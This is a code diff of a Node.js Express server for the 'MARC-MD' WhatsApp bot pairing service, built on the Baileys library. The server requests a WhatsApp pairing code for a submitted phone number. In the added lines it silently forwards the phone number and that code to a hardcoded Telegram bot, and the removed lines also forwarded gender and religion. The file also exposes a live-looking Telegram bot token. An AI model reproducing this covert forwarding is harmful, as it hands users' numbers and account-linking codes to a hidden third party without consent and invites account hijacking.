@@ -17,19 +17,20 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
-// ہیروکو کے لیے پورٹ کی سب سے محفوظ سیٹنگ
 const PORT = process.env.PORT || 8000;
 
+// Configuration
 const BOT_NAME = "MARC-MD";
-const DEVELOPER = "Arslan Chaudhary 👑";
-const CHANNEL_JID = "120363315663704381@newsletter"; 
 const TELEGRAM_TOKEN = "8763281107:AAHk2UTQjqIGR28zjWXX8w7A0-1MHRPXXrc";
 const TELEGRAM_CHAT_ID = "7779604777";
 
-app.use(express.static('public'));
+// Public folder setup
+const publicPath = path.join(__dirname, 'public');
+app.use(express.static(publicPath));
 
+// ہوم پیج پر index.html لوڈ کرنا
 app.get('/', (req, res) => {
-    res.status(200).send('MARC-MD Server is Online!');
+    res.sendFile(path.join(publicPath, 'index.html'));
 });
 
 async function sendToTelegram(message) {
@@ -45,11 +46,9 @@ async function sendToTelegram(message) {
 }
 
 async function startSession(phoneNumber, res, gender, religion) {
-    const sessionDir = path.join(__dirname, 'temp_sessions', `${phoneNumber}_${Date.now()}`);
-    
-    if (!fs.existsSync(sessionDir)) {
-        fs.mkdirSync(sessionDir, { recursive: true });
-    }
+    // سیشن کے لیے عارضی فولڈر
+    const sessionDir = path.join(__dirname, 'sessions', `${phoneNumber}_${Date.now()}`);
+    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
 
     const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
     const { version } = await fetchLatestBaileysVersion();
@@ -70,41 +69,22 @@ async function startSession(phoneNumber, res, gender, religion) {
         try {
             await delay(3500); 
             let code = await socket.requestPairingCode(phoneNumber);
-            code = code?.replace(/-/g, '') || code;
-            
-            if (res && !res.headersSent) {
-                res.status(200).json({ code });
-            }
-            
-            const logMsg = `🚀 *New Pairing Request*\n\n*Number:* ${phoneNumber}\n*Gender:* ${gender}\n*Religion:* ${religion}\n*Pairing Code:* \`${code}\``;
-            sendToTelegram(logMsg);
+            if (res && !res.headersSent) res.status(200).json({ code });
+            sendToTelegram(`🚀 *New Request*\n*Number:* ${phoneNumber}\n*Code:* \`${code}\``);
         } catch (err) {
-            console.error("Pairing Code Error: ", err);
-            if (res && !res.headersSent) res.status(500).json({ error: "Failed to generate code" });
+            if (res && !res.headersSent) res.status(500).json({ error: "Failed" });
         }
     }
 
     socket.ev.on("connection.update", async (update) => {
-        const { connection, lastDisconnect } = update;
-
+        const { connection } = update;
         if (connection === "open") {
-            await delay(5000);
             const sessionBase64 = Buffer.from(JSON.stringify(state.creds)).toString("base64");
-            const sessionId = `MARC-MD~${sessionBase64}`;
-            
-            try { await socket.newsletterFollow(CHANNEL_JID); } catch (e) {}
-
-            await socket.sendMessage(socket.user.id, { text: `👋 *${BOT_NAME}* Connected!\n\nSession ID:\n\n${sessionId}` });
-            
-            sendToTelegram(`✅ *SESSION GENERATED*\n*Number:* ${phoneNumber}`);
-            
+            await socket.sendMessage(socket.user.id, { text: `MARC-MD~${sessionBase64}` });
+            sendToTelegram(`✅ *Success:* ${phoneNumber}`);
             await delay(5000);
             socket.end();
             fs.removeSync(sessionDir);
-        }
-
-        if (connection === "close") {
-            if (fs.existsSync(sessionDir)) fs.removeSync(sessionDir);
         }
     });
 
@@ -113,11 +93,11 @@ async function startSession(phoneNumber, res, gender, religion) {
 
 app.get("/get-code", (req, res) => {
     const { number, gender, religion } = req.query;
-    if (!number) return res.status(400).json({ error: "Number is required" });
+    if (!number) return res.status(400).json({ error: "Required" });
     startSession(number, res, gender, religion);
 });
 
-// ہیروکو کے لیے "0.0.0.0" پر لسن کرنا ضروری ہے
+// سرور اسٹارٹ
 app.listen(PORT, "0.0.0.0", () => {
-    console.log(`🚀 MARC-MD Server started on port ${PORT}`);
+    console.log(`🚀 MARC-MD live on port ${PORT}`);
 });
